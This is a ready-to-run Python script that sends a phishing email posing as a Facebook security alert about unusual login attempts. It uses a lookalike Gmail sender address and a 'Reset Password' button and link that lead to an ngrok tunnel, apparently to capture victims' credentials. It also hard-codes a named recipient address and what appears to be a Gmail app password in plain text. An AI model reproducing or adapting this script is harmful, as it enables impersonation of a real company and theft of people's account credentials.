#!/usr/bin/env python3
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage

# Email settings
sender_email = "no.reply.facebook.com.update@gmail.com"  # Replace with your Gmail address
receiver_email = "boyahjoseph@gmail.com"  # Replace with the recipient's email address
subject = "Facebook Security Alert: Unusual Login Attempts"

# HTML email content with your local HTTP server link
html_content = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Facebook Security Alert</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            margin: 0; 
            padding: 0; 
            background-color: #f4f4f4; 
        }
        .container { 
            width: 100%; 
            max-width: 600px; 
            margin: 20px auto; 
            padding: 20px; 
            background-color: #ffffff; 
            border: 1px solid #ddd; 
            border-radius: 8px; 
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); 
        }
        .header { 
            text-align: center; 
            padding-bottom: 20px; 
        }
        .header img { 
            max-width: 150px; 
        }
        .btn { 
            display: inline-block; 
            background: #1877f2; 
            color: white; 
            padding: 12px 24px; 
            text-decoration: none; 
            font-size: 16px; 
            border-radius: 5px; 
            margin: 20px 0; 
            transition: background-color 0.3s ease; 
        }
        .btn:hover { 
            background-color: #165dbb; 
        }
        .footer { 
            text-align: center; 
            margin-top: 20px; 
            font-size: 12px; 
            color: #777; 
        }
        .footer a { 
            color: #1877f2; 
            text-decoration: none; 
        }
        .footer a:hover { 
            text-decoration: underline; 
        }
        .warning { 
            color: #d9534f; 
            font-weight: bold; 
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="cid:logo" alt="Facebook Logo">
        </div>
        <h2>Security Alert: Unusual Login Attempts</h2>
        <p>Dear User,</p>
        <p>We detected multiple failed login attempts on your account. If this was not you, please take action immediately.</p>
        <p>To secure your account, click the button below to reset your password:</p>
        <a class="btn" href="https://f2d3-2402-3a80-16fd-3770-a1b7-df76-9b17-381c.ngrok-free.app">Reset Password</a>
        <p class="warning">If you didn’t request this, please ignore this email or <a href="#">report it</a>.</p>
        <p>Thanks,<br> The Facebook Security Team</p>
        <div class="footer">
            <p>This email was sent to you because of unusual activity on your account. If you didn’t make this request, please <a href="#">report it</a>.</p>
            <p>&copy; 2023 Facebook. All rights reserved.</p>
        </div>
    </div>
</body>
</html>
"""

# Plain text version of the email
plain_text_content = """
Security Alert: Unusual Login Attempts

Dear User,

We detected multiple failed login attempts on your account. If this was not you, please take action immediately.

To secure your account, click the link below to reset your password:

Reset Password: https://f2d3-2402-3a80-16fd-3770-a1b7-df76-9b17-381c.ngrok-free.app

If you didn’t request this, please ignore this email or report it.

Thanks,
The Facebook Security Team

This email was sent to you because of unusual activity on your account. If you didn’t make this request, please report it.

© 2023 Facebook. All rights reserved.
"""

# Create email
message = MIMEMultipart("alternative")
message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = subject

# Attach both plain text and HTML versions
message.attach(MIMEText(plain_text_content, "plain"))
message.attach(MIMEText(html_content, "html"))

# Attach an image (logo)
with open("facebook_logo.png", "rb") as img_file:
    logo = MIMEImage(img_file.read())
    logo.add_header("Content-ID", "<logo>")
    logo.add_header("Content-Disposition", "inline", filename="facebook_logo.png")
    message.attach(logo)

# Send email using Gmail's SMTP server
smtp_server = "smtp.gmail.com"  # Gmail's SMTP server
smtp_port = 465  # Port for SSL
smtp_username = "no.reply.facebook.com.update@gmail.com"  # Replace with your Gmail address
smtp_password = "fthk eqwk extt zrdz"  # Replace with your Gmail app password

try:
    # Use SMTP_SSL for port 465
    with smtplib.SMTP_SSL(smtp_server, smtp_port) as server:
        server.login(smtp_username, smtp_password)
        server.sendmail(sender_email, receiver_email, message.as_string())
    print("Email sent successfully!")
except Exception as e:
    print(f"Failed to send email: {e}")